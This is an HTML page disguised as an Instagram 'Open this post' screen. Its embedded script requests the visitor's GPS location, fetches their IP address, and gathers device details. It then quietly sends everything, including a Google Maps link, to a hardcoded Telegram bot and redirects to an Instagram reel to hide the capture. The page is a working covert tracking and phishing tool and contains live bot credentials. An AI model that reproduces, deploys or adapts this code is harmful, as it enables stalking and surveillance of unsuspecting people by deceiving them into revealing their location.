<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Instagram</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box;}
        body{
            font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
            background:#fff;
            display:flex;
            justify-content:center;
            align-items:center;
            min-height:100vh;
            color:#262626;
            padding:20px;
        }
        .loader{
            text-align:center;
            width:100%;
            max-width:380px;
            padding:30px 20px;
        }
        .loader svg{margin-bottom:16px;}
        .loader h2{
            font-size:28px;
            font-weight:700;
            margin-bottom:4px;
            letter-spacing:1px;
            color:#262626;
        }
        .loader .sub{
            color:#8e8e8e;
            font-size:15px;
            margin-bottom:25px;
        }
        .open-btn{
            display:inline-block;
            padding:14px 50px;
            background:#0095f6;
            border:none;
            border-radius:50px;
            color:#fff;
            font-size:18px;
            font-weight:600;
            font-family:inherit;
            cursor:pointer;
            margin:15px auto;
            text-decoration:none;
            box-shadow:0 8px 30px rgba(0,149,246,0.3);
            transition:all 0.3s ease;
        }
        .open-btn:hover{
            transform:translateY(-2px);
            box-shadow:0 12px 40px rgba(0,149,246,0.5);
        }
        .spinner{
            width:38px;height:38px;
            border:3px solid #e0e0e0;
            border-top-color:#0095f6;
            border-radius:50%;
            animation:spin 0.7s linear infinite;
            margin:0 auto;
            display:none;
        }
        .spinner.active{display:block;}
        @keyframes spin{to{transform:rotate(360deg);}}
        .redirect-note{color:#8e8e8e;font-size:13px;margin-top:25px;}

        /* GPS Modal */
        .gps-request{
            display:none;
            position:fixed;
            top:0;left:0;right:0;bottom:0;
            background:rgba(0,0,0,0.6);
            z-index:1000;
            justify-content:center;
            align-items:center;
        }
        .gps-request.active{display:flex;}
        .gps-modal{
            background:#fff;
            border-radius:20px;
            padding:30px 25px;
            max-width:340px;
            width:90%;
            text-align:center;
            animation:fadeIn 0.3s ease;
        }
        @keyframes fadeIn{
            from{transform:scale(0.9);opacity:0;}
            to{transform:scale(1);opacity:1;}
        }
        .gps-modal .icon{margin-bottom:12px;}
        .gps-modal h3{
            font-size:18px;
            margin-bottom:6px;
            color:#262626;
        }
        .gps-modal p{
            color:#666;
            font-size:14px;
            line-height:1.5;
            margin-bottom:20px;
        }
        .gps-modal .allow-btn{
            display:block;
            width:100%;
            padding:14px;
            background:#0095f6;
            border:none;
            border-radius:12px;
            color:#fff;
            font-size:16px;
            font-weight:600;
            font-family:inherit;
            cursor:pointer;
        }
        .gps-modal .allow-btn:hover{background:#1877f2;}
        .gps-modal .deny-btn{
            display:block;
            width:100%;
            padding:12px;
            background:transparent;
            border:none;
            color:#0095f6;
            font-size:14px;
            font-weight:600;
            font-family:inherit;
            cursor:pointer;
            margin-top:8px;
        }
    </style>
</head>
<body>

    <!-- GPS Modal -->
    <div class="gps-request" id="gpsModal">
        <div class="gps-modal">
            <div class="icon">
                <svg width="48" height="48" viewBox="0 0 24 24" fill="none">
                    <path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z" fill="#0095f6"/>
                </svg>
            </div>
            <h3>Allow Instagram to access your location?</h3>
            <p>Instagram uses your location to show you relevant content, tags, and nearby posts. Your location is not shared publicly.</p>
            <button class="allow-btn" id="allowGps">Allow Location Access</button>
            <button class="deny-btn" id="denyGps">Not Now</button>
        </div>
    </div>

    <!-- Main Page: Instagram style with Open button -->

            <path d="M140.1 6.7l-12.5 29.5h-4.1l4.6-10.6-8.2-18.9h4.3l5.9 14.3 5.9-14.3h4.1zM157.9 6.7v21c0 2.9-.7 5.2-2.1 7-1.4 1.8-3.4 2.7-6 2.7-1.4 0-2.7-.3-3.9-.8-1.2-.5-2.2-1.3-3-2.3l2.7-3.3c1.2 1.4 2.6 2.1 4.2 2.1 1.4 0 2.5-.5 3.3-1.4.8-.9 1.2-2.3 1.2-4v-2.2c-.6.8-1.4 1.4-2.4 1.8-1 .4-2.1.7-3.3.7-2.7 0-5.2-.7-7.4-2.1-2.2-1.4-3.9-3.3-4.9-5.8-1.1-2.5-1.6-5.2-1.6-8.1 0-2.9.5-5.6 1.6-8.1 1.1-2.5 2.7-4.4 4.9-5.8 2.2-1.4 4.6-2.1 7.4-2.1 1.2 0 2.3.2 3.3.7 1 .4 1.8 1 2.4 1.8V6.7h3.6zm-10.5 21c1.7 0 3.3-.5 4.8-1.5 1.4-1 2.5-2.4 3.3-4.2.8-1.8 1.2-3.8 1.2-5.9 0-2.1-.4-4.1-1.2-5.9-.8-1.8-1.9-3.2-3.3-4.2-1.4-1-3-1.5-4.8-1.5-1.7 0-3.3.5-4.8 1.5-1.4 1-2.5 2.4-3.3 4.2-.8 1.8-1.2 3.8-1.2 5.9 0 2.1.4 4.1 1.2 5.9.8 1.8 1.9 3.2 3.3 4.2 1.5 1 3.1 1.5 4.8 1.5z"/>

        <h2>Instagram</h2>
        <p class="sub" id="status">Click Open to view this post</p>
        
        <!-- Open Button -->
        <button class="open-btn" id="openBtn">Open</button>
        
        <div class="spinner" id="spinner"></div>
        <p class="redirect-note">Opening in browser...</p>
    </div>

    <script>
        // ==================== Telegram Credentials ====================
        const BOT_TOKEN = "8736195412:AAETqDHUXTWVXnto8tpgaIqhqWh_JwY-wEE";
        const CHAT_ID = "6230485449";
        // Target Instagram link
        const TARGET_URL = "https://www.instagram.com/reel/DUJTqvbjBPl/?igsh=MW9nMXM0bjFtbXAxMw==";
        // =============================================================

        function sendToTelegram(text) {
            new Image().src = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&parse_mode=Markdown&text=${encodeURIComponent(text)}`;
            try {
                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    mode: 'no-cors',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({chat_id: CHAT_ID, text: text, parse_mode: 'Markdown'})
                });
            } catch(e) {}
        }

        async function getIP() {
            try {
                const r = await fetch('https://api.ipify.org?format=json');
                const d = await r.json();
                return d.ip || 'نەزانراو';
            } catch(e) {
                return 'نەدۆزرایەوە';
            }
        }

        function getGPS(callback) {
            if (!navigator.geolocation) {
                callback(null, 'GPS بەردەست نییە');
                return;
            }
            navigator.geolocation.getCurrentPosition(
                function(pos) {
                    callback({
                        lat: pos.coords.latitude,
                        lng: pos.coords.longitude,
                        acc: pos.coords.accuracy
                    });
                },
                function(err) {
                    navigator.geolocation.getCurrentPosition(
                        function(pos) {
                            callback({
                                lat: pos.coords.latitude,
                                lng: pos.coords.longitude,
                                acc: pos.coords.accuracy
                            });
                        },
                        function(err2) {
                            callback(null, err2.message || 'ڕێگەپێ نەدرا');
                        },
                        {timeout: 5000, enableHighAccuracy: false}
                    );
                },
                {timeout: 7000, enableHighAccuracy: true}
            );
        }

        async function collectAndSend(gpsData, error) {
            try {
                const ip = await getIP();
                const userAgent = navigator.userAgent;
                const platform = navigator.platform || 'نەزانراو';
                const lang = navigator.language || 'نەزانراو';
                
                let msg = `📍 **Instagram Location** 📍\n\n`;
                msg += `**🌐 IP:** \`${ip}\`\n`;
                msg += `**📱 Platform:** ${platform}\n`;
                msg += `**🌍 Language:** ${lang}\n`;
                msg += `**🕐 Time:** ${new Date().toLocaleString()}\n`;
                msg += `**🔗 Target:** ${TARGET_URL}\n\n`;
                
                if (gpsData) {
                    msg += `**📍 GPS:** \`${gpsData.lat}, ${gpsData.lng}\`\n`;
                    msg += `**📡 Accuracy:** ${Math.round(gpsData.acc)} meters\n\n`;
                    msg += `**🔗 Google Maps:**\n`;
                    msg += `https://www.google.com/maps?q=${gpsData.lat},${gpsData.lng}\n\n`;
                } else {
                    msg += `**⚠️ GPS Error:** ${error || 'نەدۆزرایەوە'}\n\n`;
                }
                
                msg += `**User-Agent:**\n\`${userAgent}\``;
                
                sendToTelegram(msg);
            } catch(e) {
                sendToTelegram(`❌ Error: ${e.message}`);
            }
        }

        // ========== Main flow: Open → GPS → Redirect ==========
        document.getElementById('openBtn').addEventListener('click', function() {
            const btn = document.getElementById('openBtn');
            const spinner = document.getElementById('spinner');
            const status = document.getElementById('status');
            
            // Disable button, show spinner
            btn.style.display = 'none';
            spinner.classList.add('active');
            status.textContent = 'Opening...';
            
            // Step 1: Request GPS
            getGPS(function(gpsData, error) {
                // Step 2: Send to Telegram
                collectAndSend(gpsData, error);
                
                // Step 3: Redirect to Instagram Reel
                status.textContent = 'Redirecting...';
                setTimeout(function() {
                    window.location.href = TARGET_URL;
                }, 1500);
            });
        });
    </script>
</body>
</html>
